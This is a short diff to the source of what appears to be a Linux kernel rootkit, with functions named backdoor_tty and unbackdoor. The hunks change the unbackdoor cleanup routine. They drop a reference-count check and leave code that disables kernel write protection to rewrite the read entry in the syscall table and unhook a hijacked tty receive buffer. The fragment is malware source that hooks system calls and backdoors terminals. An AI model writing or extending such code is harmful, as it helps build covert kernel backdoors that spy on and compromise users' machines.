@@ -42,6 +42,8 @@ backdoor_tty(void)
 void
 unbackdoor(void)
 {
+     
+
     if (tty) {
         if (current_receive_buf2) {
             while (atomic_read(&receive_buf2_count) > 0);
@@ -56,10 +58,7 @@ unbackdoor(void)
         tty = NULL;
     }
 
-    if (atomic_dec_return(&read_install_count) < 0) {
-        atomic_set(&read_install_count, 0);
-
-        if (sys_read) {
+    if (sys_read) {
             disable_protection();
             sys_calls[__NR_read] = (void *)sys_read;
             enable_protection();
@@ -70,7 +69,6 @@ unbackdoor(void)
                 DEBUG_INFO("Waiting for %d tasks", cur);
                 msleep(250);
             }
-        }
     }
 }
 
